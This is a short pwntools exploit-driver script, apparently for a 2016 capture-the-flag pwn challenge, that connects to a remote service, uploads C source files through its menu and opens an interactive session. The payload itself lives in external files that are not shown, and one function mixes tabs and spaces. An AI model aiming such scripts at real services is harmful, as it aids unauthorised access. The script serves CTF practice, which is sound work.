#!/usr/bin/python

from pwn import *

def sendCode(s, fileName):
	s.recvuntil('Main menu>> ')
	s.sendline('1')

	log.info(s.recvuntil('###########################################'))
	f = open(fileName, 'r')

	for i in range(512):
		l = f.readline()
		if not l:
			s.sendline('CTOCPP::EOF')	
                        break
		else:
			log.success(l)
			s.send(l)
	f.close()

def sendCode2(s, fileName):
	s.recvuntil('Main menu>> ')
	s.sendline('1')

	log.info(s.recvuntil('###########################################'))
	f = open(fileName, 'r')

	for i in range(512):
		l = f.readline()
		if not l:
			s.sendline(' ')	
		else:
			log.success(l)
			s.send(l)
	f.close()

def showCode(s):
	s.recvuntil('Main menu>> ')
	s.sendline('3')
	
	r = ''
	for i in range(512):
		l = s.recvline()
		r += l
	print r


#s = remote('localhost', 4000)
s = remote('kapo2016-pwn6363.cloudapp.net',14000)



#sendCode(s,'code3.c')
#showCode(s)

sendCode2(s,'code.c')

"""
s.recvuntil(">>")
s.sendline("2")

s.recvuntil(">>")
s.sendline("2")

s.recvuntil(">>")
s.sendline("0")

s.recvuntil(">>")
s.sendline("4")

s.recvuntil("<<")

response = s.recvuntil("\n")

print "~~", response.encode("hex")
"""

s.interactive()


s.close()
